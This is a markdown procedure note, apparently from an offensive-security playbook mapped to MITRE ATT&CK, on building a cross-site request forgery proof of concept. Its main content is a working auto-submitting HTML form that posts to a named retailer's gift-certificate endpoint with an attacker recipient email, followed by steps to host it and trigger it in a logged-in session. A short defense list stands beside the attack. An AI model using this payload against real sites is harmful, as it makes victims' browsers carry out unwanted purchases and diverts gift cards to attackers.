---
id: proc-create-csrf-poc
tags:
  - csrf
  - poc
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:42.800Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-and-Test-CSRF-POC

## Summary

This procedure develops an HTML-based proof-of-concept to exploit the CSRF vulnerability, tricking authenticated users into adding a gift certificate to their cart remotely.

## Description

The POC is a malicious HTML form auto-submitting POST data to the endpoint, including amount, recipient email, etc. Tested on a new account to confirm lockout. Scenario: Victim visits attacker's site while logged in; outcome: Cart locked, potential gift card delivery to attacker.

## Requirements

1. Text editor for HTML
2. Web server to host POC
3. Test account on target site

## Defense

Defensive measures and detection strategies:

- Require CSRF tokens in all forms
- Educate users on phishing risks
- Monitor for rapid cart changes

## Objectives

1. Build exploitable HTML form
2. Test on controlled account
3. Validate remote execution

## Instructions

### Step 1: Develop HTML POC

**Context**: Create form that posts to the endpoint.

Save as poc.html:
```html
<html><body><form action="http://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/GiftCert-AddToBasket" method="POST" id="csrfform">
<input type="hidden" name="dwfrm_giftcert_purchase_amount" value="100">
<input type="hidden" name="dwfrm_giftcert_purchase_recipientEmail" value="attacker@example.com">
<!-- Add other params -->
</form><script>document.getElementById('csrfform').submit();</script></body></html>
```

> Auto-submits on load. Expected: Form data sent to endpoint.

### Step 2: Test POC

**Context**: Host and visit while logged in to test site.

Host on local server, log in to Teavana, visit POC URL.

> Expected output: Gift cert added; cart locked on test account.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[poc]]
- [[web]]
